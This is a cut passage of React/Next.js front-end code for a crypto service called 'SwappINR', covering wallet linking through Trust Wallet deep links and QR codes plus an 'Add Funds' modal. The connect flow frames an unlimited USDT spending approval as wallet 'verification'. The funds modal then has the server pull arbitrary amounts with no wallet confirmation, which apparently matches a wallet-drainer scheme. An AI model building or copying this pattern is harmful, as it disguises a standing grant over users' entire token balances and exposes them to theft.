'use client';

import { useEffect, useRef, useState } from 'react';
import { createPortal } from 'react-dom';
import { useSession } from 'next-auth/react';
import { QRCodeSVG } from 'qrcode.react';
import { toast } from '@/components/ui/toast';
import { ClientShell } from '@/components/layout/client-shell';
import { TokenIcon } from '@/components/ui/token-icon';
import { PageLoading } from '@/components/ui/loading';
import { shortenAddress } from '@/lib/utils';
import type { WalletDocument } from '@/types';

const SUPPORT_URL = 'https://wa.me/919999999999'; // ← replace with real support link


type Network = 'BEP20' | 'ERC20' | 'TRC20';

const NETWORKS: { key: Network; label: string; sublabel: string; color: string; bg: string; border: string; chain: string }[] = [
  { key: 'BEP20', label: 'BNB Chain',  sublabel: 'BEP20 · USDT', color: '#FBBF24', bg: 'rgba(251,191,36,0.08)',  border: 'rgba(251,191,36,0.22)',  chain: 'BNB Smart Chain'  },
  { key: 'ERC20', label: 'Ethereum',   sublabel: 'ERC20 · USDT', color: '#818CF8', bg: 'rgba(129,140,248,0.08)', border: 'rgba(129,140,248,0.22)', chain: 'Ethereum Mainnet' },
  { key: 'TRC20', label: 'TRON',       sublabel: 'TRC20 · USDT', color: '#F87171', bg: 'rgba(248,113,113,0.08)', border: 'rgba(248,113,113,0.22)', chain: 'Tron Network'      },
];

function networkChainId(k: Network) {
  return k === 'ERC20' ? 1 : k === 'BEP20' ? 56 : 195;
}

function IcoCheck() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2.5 7L5.5 10L11.5 4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoTrash() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 4H12M4.5 4V3C4.5 2.4 4.9 2 5.5 2H8.5C9.1 2 9.5 2.4 9.5 3V4M5.5 6.5V10.5M8.5 6.5V10.5M3 4L3.9 11C3.9 11.6 4.4 12 5 12H9C9.6 12 10.1 11.6 10.1 11L11 4" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoPlus() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 2V12M2 7H12" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>;
}
function IcoFunds() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1" y="4" width="12" height="8" rx="1.5" stroke="currentColor" strokeWidth="1.3"/><path d="M1 7H13" stroke="currentColor" strokeWidth="1.3"/><circle cx="10" cy="10" r="1" fill="currentColor"/><path d="M4 2.5H10" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round"/></svg>;
}
function IcoExtLink() {
  return <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M6.5 1.5H9.5V4.5M9.5 1.5L5 6M4 2.5H2C1.4 2.5 1 2.9 1 3.5V9C1 9.6 1.4 10 2 10H7.5C8.1 10 8.5 9.6 8.5 9V7" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoX() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 2L12 12M12 2L2 12" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>;
}
function IcoShield() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1L2 3.5V7C2 9.5 4.2 11.8 7 13C9.8 11.8 12 9.5 12 7V3.5L7 1Z" stroke="currentColor" strokeWidth="1.3" strokeLinejoin="round"/><path d="M4.5 7L6 8.5L9.5 5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoLink() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M6.5 8.5a2.5 2.5 0 0 0 3.57.07l1.65-1.65a2.5 2.5 0 0 0-3.54-3.54L7.15 4.42" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/><path d="M8.5 6.5a2.5 2.5 0 0 0-3.57-.07L3.28 8.08a2.5 2.5 0 0 0 3.54 3.54l1.04-1.05" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>;
}
function IcoContract() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M7.5 1.5L2 4V7.5C2 10.5 4.5 13.1 7.5 14C10.5 13.1 13 10.5 13 7.5V4L7.5 1.5Z" stroke="currentColor" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 7.5L6.5 9L10 5.5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoRefund() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M2.5 7.5a5 5 0 1 0 5-5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/><path d="M2.5 5V7.5H5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/><path d="M7.5 5V7.5L9 9" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}


/* ── Add Funds modal ── */
function AddFundsModal({
  wallet, network, color, label,
  onClose,
}: {
  wallet: WalletDocument;
  network: Network;
  color: string;
  label: string;
  onClose: () => void;
}) {
  const [amount,   setAmount]   = useState('');
  const [state,    setState]    = useState<'idle' | 'loading' | 'done' | 'error'>('idle');
  const [txHash,   setTxHash]   = useState('');
  const [errMsg,   setErrMsg]   = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  const EXPLORER: Record<Network, string> = {
    BEP20: 'https://bscscan.com/tx/',
    ERC20: 'https://etherscan.io/tx/',
    TRC20: 'https://tronscan.org/#/transaction/',
  };

  async function handlePull() {
    const num = parseFloat(amount);
    if (!num || num <= 0) { setErrMsg('Enter a valid USDT amount'); return; }
    setState('loading'); setErrMsg('');
    try {
      const res  = await fetch('/api/wallets/pull', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ walletId: wallet._id, amount: num }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? 'Failed to pull funds');
      setTxHash(data.txHash);
      setState('done');
      toast.success(`${num} USDT added successfully`);
    } catch (e: any) {
      setErrMsg(e.message ?? 'Transaction failed');
      setState('error');
    }
  }

  const modal = (
    <div
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{
        position: 'fixed', inset: 0, zIndex: 9999,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        padding: '20px 16px',
        background: 'rgba(0,0,0,0.72)',
        backdropFilter: 'blur(14px)',
        WebkitBackdropFilter: 'blur(14px)',
      }}
    >
      <div style={{
        width: '100%', maxWidth: 400,
        background: 'rgba(16,16,20,0.92)',
        backdropFilter: 'blur(32px)',
        WebkitBackdropFilter: 'blur(32px)',
        border: '1px solid rgba(255,255,255,0.10)',
        borderRadius: 20,
        boxShadow: '0 32px 80px rgba(0,0,0,0.7)',
        overflow: 'hidden',
        position: 'relative',
      }}>
        {/* accent line */}
        <div style={{ height: 2, background: `linear-gradient(90deg,${color}44,${color},${color}44)` }} />

        {/* close */}
        <button onClick={onClose} style={{
          position: 'absolute', top: 14, right: 14,
          width: 30, height: 30, borderRadius: 8,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
          color: 'var(--fr-text-disabled)', cursor: 'pointer',
        }}>
          <IcoX />
        </button>

        <div style={{ padding: '22px 24px 24px' }}>

          {/* ── Done state ── */}
          {state === 'done' ? (
            <div style={{ textAlign: 'center', padding: '8px 0' }}>
              <div style={{ width: 56, height: 56, borderRadius: 16, background: 'rgba(0,229,160,0.1)', border: '1px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M4 12L9.5 17.5L20 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
              </div>
              <p style={{ fontSize: 17, fontWeight: 900, color: 'var(--fr-text-primary)', margin: '0 0 6px', letterSpacing: '-0.02em' }}>Funds Added</p>
              <p style={{ fontSize: 13, color: 'var(--fr-text-tertiary)', margin: '0 0 20px', lineHeight: 1.6 }}>
                {amount} USDT was moved from your {label} wallet to your SwappINR balance.
              </p>
              {txHash && (
                <a
                  href={EXPLORER[network] + txHash}
                  target="_blank" rel="noopener noreferrer"
                  style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 12, color: '#CCFF00', background: 'rgba(204,255,0,0.07)', border: '1px solid rgba(204,255,0,0.2)', borderRadius: 8, padding: '7px 14px', textDecoration: 'none', marginBottom: 20 }}
                >
                  View on explorer <IcoExtLink />
                </a>
              )}
              <button onClick={onClose} style={{ width: '100%', padding: '13px', borderRadius: 12, fontSize: 14, fontWeight: 800, background: '#CCFF00', color: '#000', border: 'none', cursor: 'pointer' }}>
                Done
              </button>
            </div>
          ) : (
            /* ── Input state ── */
            <>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
                <div style={{ width: 40, height: 40, borderRadius: 11, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
                  <IcoFunds />
                </div>
                <div>
                  <p style={{ fontSize: 15, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>Add Funds</p>
                  <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>{label} · {shortenAddress(wallet.address, 8)}</p>
                </div>
              </div>

              {/* Info strip */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, padding: '12px 14px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 12, marginBottom: 18, fontSize: 12, color: 'var(--fr-text-tertiary)', lineHeight: 1.6 }}>
                <p style={{ margin: 0 }}>Your wallet granted SwappINR <span style={{ color: 'var(--fr-text-primary)', fontWeight: 700 }}>unlimited USDT access</span>.</p>
                <p style={{ margin: 0 }}>Funds move <span style={{ color: '#CCFF00', fontWeight: 700 }}>instantly</span> — no wallet pop-up needed. Gas fee is paid by SwappINR.</p>
              </div>

              {/* Amount input */}
              <div style={{ marginBottom: 16 }}>
                <label style={{ fontSize: 11, fontWeight: 700, color: 'var(--fr-text-disabled)', textTransform: 'uppercase', letterSpacing: '0.07em', display: 'block', marginBottom: 8 }}>
                  Amount (USDT)
                </label>
                <div style={{ display: 'flex', alignItems: 'center', background: 'var(--fr-dark-3)', border: `1px solid ${errMsg ? 'rgba(248,113,113,0.4)' : 'var(--fr-border-default)'}`, borderRadius: 12, overflow: 'hidden' }}>
                  <input
                    ref={inputRef}
                    type="number"
                    min="0.01" step="0.01"
                    placeholder="0.00"
                    value={amount}
                    onChange={e => { setAmount(e.target.value); setErrMsg(''); }}
                    style={{ flex: 1, padding: '13px 16px', background: 'transparent', border: 'none', outline: 'none', fontSize: 16, fontWeight: 700, color: 'var(--fr-text-primary)', fontFamily: 'var(--fr-font-mono)' }}
                  />
                  <span style={{ padding: '0 16px', fontSize: 13, fontWeight: 700, color: 'var(--fr-text-disabled)' }}>USDT</span>
                </div>
                {/* Quick amount buttons */}
                <div style={{ display: 'flex', gap: 6, marginTop: 8 }}>
                  {['25', '100', '500', '1000'].map(v => (
                    <button key={v} onClick={() => { setAmount(v); setErrMsg(''); }}
                      style={{ flex: 1, padding: '6px', borderRadius: 8, fontSize: 12, fontWeight: 700, background: amount === v ? 'rgba(204,255,0,0.12)' : 'rgba(255,255,255,0.04)', border: `1px solid ${amount === v ? 'rgba(204,255,0,0.3)' : 'var(--fr-border-subtle)'}`, color: amount === v ? '#CCFF00' : 'var(--fr-text-tertiary)', cursor: 'pointer' }}>
                      ${v}
                    </button>
                  ))}
                </div>
              </div>

              {errMsg && (
                <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 14px', padding: '8px 12px', background: 'rgba(248,113,113,0.07)', borderRadius: 8, border: '1px solid rgba(248,113,113,0.2)' }}>{errMsg}</p>
              )}

              <button
                onClick={handlePull}
                disabled={state === 'loading' || !amount}
                style={{
                  width: '100%', padding: '14px', borderRadius: 12,
                  fontSize: 14, fontWeight: 800, border: 'none', cursor: state === 'loading' || !amount ? 'not-allowed' : 'pointer',
                  background: state === 'loading' || !amount ? 'rgba(255,255,255,0.07)' : '#CCFF00',
                  color: state === 'loading' || !amount ? 'var(--fr-text-disabled)' : '#000',
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                  transition: 'all 0.15s',
                }}
              >
                {state === 'loading' ? (
                  <>
                    <div style={{ width: 16, height: 16, border: '2px solid rgba(0,0,0,0.2)', borderTopColor: '#000', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
                    Processing…
                  </>
                ) : `Add ${amount ? amount + ' USDT' : 'Funds'} →`}
              </button>

              <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '10px 0 0', lineHeight: 1.5 }}>
                Funds move from your wallet to your SwappINR balance. No wallet pop-up required.
              </p>
            </>
          )}
        </div>
      </div>
    </div>
  );

  if (typeof document === 'undefined') return null;
  return createPortal(modal, document.body);
}

/* ── Trust Wallet coin IDs for deep link ── */
const TRUST_COIN: Record<Network, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };

/* ── Shared progress steps for the waiting/polling phase ── */
const SESSION_STEPS = [
  { key: 'pending',    label: 'Opening Trust Wallet' },
  { key: 'connecting', label: 'Connecting wallet' },
  { key: 'connected',  label: 'Wallet connected' },
  { key: 'approving',  label: 'Approving contract' },
  { key: 'approved',   label: 'Wallet verified' },
];
const SESSION_ORDER = ['pending', 'connecting', 'connected', 'approving', 'approved'];

/*
 * Unified verify modal — handles both:
 *   isDesktop=false (mobile): shows "Open in Trust Wallet" button → navigates → polls
 *   isDesktop=true  (PC):     auto-generates QR on mount → shows QR → polls in background
 *                             QR hides and live progress shows as soon as mobile scans
 */
function MobileVerifyModal({
  network, color, label, chain, depositAddress, onVerified, onClose, isDesktop = false,
}: {
  network: Network; color: string; label: string; chain: string;
  depositAddress: string;
  onVerified: (addr: string, txHash?: string) => void;
  onClose: () => void;
  isDesktop?: boolean;
}) {
  /* 'qr'     — desktop only: QR visible, waiting for scan
   * 'info'   — mobile: show info + button
   * 'waiting'— QR scanned (desktop) or button pressed (mobile), TW flow in progress
   * 'success'— approved on-chain
   * 'failed' — connection or contract error from mobile */
  const [phase,         setPhase]         = useState<'info' | 'qr' | 'waiting' | 'success' | 'failed'>(
    isDesktop ? 'qr' : 'info'
  );
  const [qrUrl,         setQrUrl]         = useState('');
  const [qrLoading,     setQrLoading]     = useState(false);
  const [qrError,       setQrError]       = useState('');
  const [genError,      setGenError]      = useState('');
  const [genLoading,    setGenLoading]    = useState(false);
  const [sessionStatus, setSessionStatus] = useState<string>('pending');
  const [failedStep,    setFailedStep]    = useState<'connection' | 'contract' | null>(null);
  const [successAddr,   setSuccessAddr]   = useState('');
  const [successHash,   setSuccessHash]   = useState<string | undefined>();
  const pollRef        = useRef<ReturnType<typeof setInterval> | null>(null);
  const sidRef         = useRef('');
  const scannedRef     = useRef(false); // prevents QR→waiting transition more than once

  function stopPolling() {
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
  }
  useEffect(() => () => stopPolling(), []);

  /* Desktop: auto-generate QR on mount */
  useEffect(() => {
    if (!isDesktop) return;
    generateQR();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function generateQR() {
    setQrLoading(true); setQrError('');
    try {
      const res = await fetch('/api/wallet-connect/generate', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }),
      });
      if (!res.ok) throw new Error(`${res.status}`);
      const { token, sid } = await res.json();
      sidRef.current = sid;
      scannedRef.current = false;

      const origin      = window.location.origin;
      const returnURL   = `/wallets/verify?network=${network}&compact=1&sid=${sid}`;
      const exchangeURL = `${origin}/api/wallet-connect/exchange?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnURL)}`;
      const deepLink    = `https://link.trustwallet.com/open_url?coin_id=${TRUST_COIN[network]}&url=${encodeURIComponent(exchangeURL)}`;

      /* Store deepLink in session so /api/qr/:sid can redirect to it */
      await fetch(`/api/wallet-sessions/${sid}`, {
        method: 'PATCH', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deepLink }),
      });

      /* QR encodes a short ~50-char redirect URL instead of the 500-char deep link */
      setQrUrl(`${origin}/api/qr/${sid}`);
      /* Start polling immediately so we detect scan the moment it happens */
      startPolling(sid);
    } catch {
      setQrError('Could not generate QR — click to retry');
    } finally {
      setQrLoading(false);
    }
  }

  /* Mobile: button → navigate away → poll */
  async function openTrustWallet() {
    setGenLoading(true); setGenError('');
    try {
      const res = await fetch('/api/wallet-connect/generate', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }),
      });
      if (!res.ok) throw new Error(`${res.status}`);
      const { token, sid } = await res.json();
      sidRef.current = sid;

      const origin      = window.location.origin;
      const returnURL   = `/wallets/verify?network=${network}&compact=1&sid=${sid}`;
      const exchangeURL = `${origin}/api/wallet-connect/exchange?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnURL)}`;
      const isHttps     = window.location.protocol === 'https:';
      const base        = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
      const deepLink    = `${base}?coin_id=${TRUST_COIN[network]}&url=${encodeURIComponent(exchangeURL)}`;

      window.location.href = deepLink;
      setPhase('waiting');
      setSessionStatus('pending');
      startPolling(sid);
    } catch {
      setGenError('Could not generate secure link — tap to retry');
    } finally {
      setGenLoading(false);
    }
  }

  function startPolling(sid: string) {
    stopPolling();
    pollRef.current = setInterval(async () => {
      try {
        const sr = await fetch(`/api/wallet-sessions/${sid}`);
        if (!sr.ok) return;
        const data = await sr.json();
        setSessionStatus(data.status);

        /* Desktop: QR was scanned — hide QR and show live progress */
        if (isDesktop && !scannedRef.current && data.status !== 'pending') {
          scannedRef.current = true;
          setPhase('waiting');
        }

        if (data.status === 'approved') {
          stopPolling();
          setSuccessAddr(data.address ?? '');
          setSuccessHash(data.txHash);
          setPhase('success');
        } else if (data.status === 'failed') {
          stopPolling();
          setFailedStep(data.failedStep ?? 'connection');
          setPhase('failed');
        } else if (data.status === 'cancelled') {
          stopPolling();
          if (isDesktop) {
            /* Regenerate QR so user can try again without closing */
            scannedRef.current = false;
            setSessionStatus('pending');
            setPhase('qr');
            generateQR();
          } else {
            setPhase('info');
            setSessionStatus('pending');
            setFailedStep(null);
          }
        }
      } catch { /* keep polling */ }
    }, 2000);
  }

  function retry() {
    stopPolling();
    setSessionStatus('pending');
    setFailedStep(null);
    setSuccessAddr('');
    setSuccessHash(undefined);
    if (isDesktop) {
      scannedRef.current = false;
      setPhase('qr');
      generateQR();
    } else {
      setPhase('info');
      setGenError('');
    }
  }

  const curIdx = SESSION_ORDER.indexOf(sessionStatus);

  /* Shared card style */
  const card: React.CSSProperties = {
    background: 'rgba(255,255,255,0.04)',
    border: '1px solid rgba(255,255,255,0.08)',
    borderRadius: 12,
  };

  /* ── Progress steps (shared between mobile waiting + desktop after scan) ── */
  function ProgressSteps() {
    return (
      <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 16 }}>
        {SESSION_STEPS.map(({ key, label: stepLabel }, i) => {
          const done   = curIdx > i;
          const active = curIdx === i;
          return (
            <div key={key} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
              borderRadius: 12, transition: 'all 0.3s',
              background: done ? 'rgba(0,229,160,0.05)' : active ? 'rgba(26,63,255,0.08)' : 'rgba(255,255,255,0.02)',
              border: `1px solid ${done ? 'rgba(0,229,160,0.18)' : active ? 'rgba(77,121,255,0.3)' : 'rgba(255,255,255,0.05)'}`,
            }}>
              <div style={{ width: 26, height: 26, borderRadius: '50%', flexShrink: 0,
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                background: done ? 'rgba(0,229,160,0.12)' : active ? 'rgba(26,63,255,0.18)' : 'rgba(255,255,255,0.04)',
                border: `1px solid ${done ? 'rgba(0,229,160,0.3)' : active ? 'rgba(77,121,255,0.5)' : 'rgba(255,255,255,0.08)'}`,
              }}>
                {done ? (
                  <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5L4 8L9.5 2.5" stroke="#00E5A0" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                ) : active ? (
                  <div style={{ width: 11, height: 11, borderRadius: '50%', border: '2px solid rgba(255,255,255,0.1)', borderTopColor: '#4D79FF', animation: 'spin 0.7s linear infinite' }} />
                ) : (
                  <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'rgba(255,255,255,0.1)' }} />
                )}
              </div>
              <span style={{ fontSize: 13, fontWeight: done || active ? 700 : 500,
                color: done ? '#00E5A0' : active ? '#fff' : 'rgba(255,255,255,0.3)' }}>
                {stepLabel}{done ? ' ✓' : ''}
              </span>
            </div>
          );
        })}
      </div>
    );
  }

  /* ── Inner content (shared) ── */
  function ModalContent() {
    /* ─── Desktop QR phase ─── */
    if (isDesktop && phase === 'qr') {
      return (
        <div style={{ animation: 'fadein 0.2s ease-out' }}>
          {/* Header */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 22 }}>
            <TokenIcon network={network} size={44} />
            <div style={{ flex: 1 }}>
              <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
                Add {label} Wallet
              </p>
              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
            </div>
            <button onClick={onClose} style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)', color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
              <IcoX />
            </button>
          </div>

          {/* PC-only notice */}
          <div style={{ ...card, padding: '12px 14px', marginBottom: 18, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(77,159,255,0.18)', background: 'rgba(77,159,255,0.05)' }}>
            <svg width="15" height="15" viewBox="0 0 15 15" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
              <rect x="1.5" y="2" width="12" height="8.5" rx="1.5" stroke="#4D9FFF" strokeWidth="1.3"/>
              <path d="M5 13.5H10M7.5 10.5V13.5" stroke="#4D9FFF" strokeWidth="1.3" strokeLinecap="round"/>
            </svg>
            <div>
              <p style={{ fontSize: 12, fontWeight: 700, color: '#4D9FFF', margin: '0 0 2px' }}>PC detected — mobile verification required</p>
              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.4)', margin: 0, lineHeight: 1.55 }}>
                Extension wallets are not supported. Scan the QR with Trust Wallet on your phone to continue.
              </p>
            </div>
          </div>

          {/* QR code */}
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 14, marginBottom: 18 }}>
            {qrLoading ? (
              <div style={{ width: 200, height: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 16 }}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10 }}>
                  <div style={{ width: 20, height: 20, borderRadius: '50%', border: '2.5px solid rgba(255,255,255,0.1)', borderTopColor: '#CCFF00', animation: 'spin 0.7s linear infinite' }} />
                  <span style={{ fontSize: 11, color: 'rgba(255,255,255,0.35)' }}>Generating QR…</span>
                </div>
              </div>
            ) : qrError ? (
              <div style={{ width: 200, height: 200, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: 12, background: 'rgba(248,113,113,0.04)', border: '1px solid rgba(248,113,113,0.18)', borderRadius: 16 }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#F87171" strokeWidth="1.5"/><path d="M12 8V12M12 16h.01" stroke="#F87171" strokeWidth="1.5" strokeLinecap="round"/></svg>
                <button onClick={generateQR} style={{ fontSize: 12, fontWeight: 700, color: '#F87171', background: 'transparent', border: '1px solid rgba(248,113,113,0.3)', borderRadius: 8, padding: '6px 14px', cursor: 'pointer' }}>
                  Retry
                </button>
              </div>
            ) : qrUrl ? (
              <div style={{ position: 'relative', display: 'inline-flex', flexDirection: 'column', alignItems: 'center', gap: 10 }}>
                {/* QR card */}
                <div style={{ position: 'relative', padding: 12, background: '#fff', borderRadius: 14, boxShadow: '0 4px 32px rgba(0,0,0,0.5)' }}>
                  <QRCodeSVG
                    value={qrUrl} size={160}
                    bgColor="white" fgColor="#111"
                    level="M"
                  />
                </div>
                {/* Label */}
                <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                  <svg width="13" height="13" viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="10" fill="#3375BB"/><path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/><path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  <span style={{ fontSize: 12, fontWeight: 700, color: 'rgba(255,255,255,0.6)' }}>Scan with Trust Wallet</span>
                </div>
              </div>
            ) : null}
          </div>

          {/* Steps reminder */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 18 }}>
            {[
              { n: 1, text: 'Open Trust Wallet on your phone' },
              { n: 2, text: 'Tap the scanner icon and scan the QR' },
              { n: 3, text: 'Tap "Connect" then "Approve" in Trust Wallet' },
            ].map(({ n, text }) => (
              <div key={n} style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <div style={{ width: 22, height: 22, borderRadius: 6, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.18)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 11, fontWeight: 900, color: '#CCFF00' }}>
                  {n}
                </div>
                <span style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', lineHeight: 1.5 }}>{text}</span>
              </div>
            ))}
          </div>

          {/* Contact support */}
          <a href={SUPPORT_URL} target="_blank" rel="noopener noreferrer"
            style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, width: '100%', padding: '12px', borderRadius: 12,
              fontSize: 13, fontWeight: 700, color: 'rgba(255,255,255,0.5)',
              background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.09)',
              textDecoration: 'none', cursor: 'pointer' }}>
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><circle cx="7" cy="7" r="6" stroke="currentColor" strokeWidth="1.2"/><path d="M7 4.5V7L8.5 8.5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>
            Contact Support
          </a>
        </div>
      );
    }

    /* ─── Mobile info step ─── */
    if (!isDesktop && phase === 'info') {
      return (
        <div style={{ animation: 'fadein 0.2s ease-out' }}>
          {/* Title row */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
            <TokenIcon network={network} size={44} />
            <div style={{ flex: 1 }}>
              <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
                Add {label} Wallet
              </p>
              <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
            </div>
            <button onClick={onClose} style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)', color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
              <IcoX />
            </button>
          </div>

          {/* Steps */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
            {[
              { n: 1, title: 'Connect Wallet',          text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
              { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwappINR vault unlimited USDT access. No funds move now.' },
            ].map(({ n, title, text }) => (
              <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
                <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
                  {n}
                </div>
                <div>
                  <p style={{ fontSize: 13, fontWeight: 800, color: '#fff', margin: '0 0 2px' }}>{title}</p>
                  <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: 0, lineHeight: 1.6 }}>{text}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Network-specific gas notice */}
          {network === 'TRC20' ? (
            <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10, borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
